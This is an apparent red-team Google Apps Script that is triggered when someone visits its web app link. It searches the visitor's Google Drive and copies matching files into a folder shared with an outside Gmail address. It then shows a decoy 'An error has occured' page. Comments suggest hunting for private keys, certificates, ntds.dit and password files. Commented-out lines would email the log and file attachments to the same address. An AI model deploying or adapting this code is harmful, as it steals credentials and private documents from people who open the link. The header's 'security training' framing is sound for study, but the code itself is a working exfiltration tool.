// Created by Ahhh 
// ---------------------------------------
// Play nice and use for security training
// and testing.

function driveSearch() {

  var folder = DriveApp.createFolder('Evil Test Folder');
  folder.addViewer("exampletest@gmail.com")
  //folder.setSharing(DriveApp.Access.ANYONE, DriveApp.Permission.EDIT);
 
  // Construct malicious search query on drive. Look for PDFs? DOC/XLS files? If you are looking for an extension use 'title contains'
  // If you want to search through content for a keyword use 'fullText contains' instead
  // You can construct more complex queries using logical operators, for example: 'and (mimeType contains 'image/' or mimeType contains 'video/')'
  // Not aware of case sensitivity or ability to perform regular expressions
  // Search Ideas? title contains .cer .pem .der .crt .pub id_rsa .docx .xlsx .vsd password .nessus ntds.dit 
  // or fullText contains password or any other combination of keywords of interest such as target individuals, target servers, etcetera
  
  var files = DriveApp.searchFiles(
     'title contains "TESTFILE"');
  while (files.hasNext()) {
    var file = files.next();
    Logger.log(file.getDownloadUrl());
    Logger.log(file.getUrl());
    Logger.log(file.getName());
    var name = file.getName();
    file.makeCopy(name,folder);
    Logger.log(file.getDownloadUrl());
    Logger.log(file.getUrl());
    
 //   Logger.log(folder.getUrl());
 //   var recipient = "exampletest@gmail.com";
 //   var subject = 'EvilDriveSearch';
 //   var body = Logger.getLog();
 //   MailApp.sendEmail(recipient, subject, body);  
 //   var file = DriveApp.getFilesByName(name);
 //   var fileBlob = file.next().getBlob();
 //   if (file.hasNext()) {
 //     MailApp.sendEmail(recipient,'Google Drive search - Attached Files','Attached file matched a search term during Google Drive app script search.',{attachments: [fileBlob], name: file.next().getName()})
 //   }
  }
  Logger.clear();

}

function doGet(e) {
  var params = JSON.stringify(e);
  driveSearch();
  return HtmlService.createHtmlOutput('An error has occured');
}

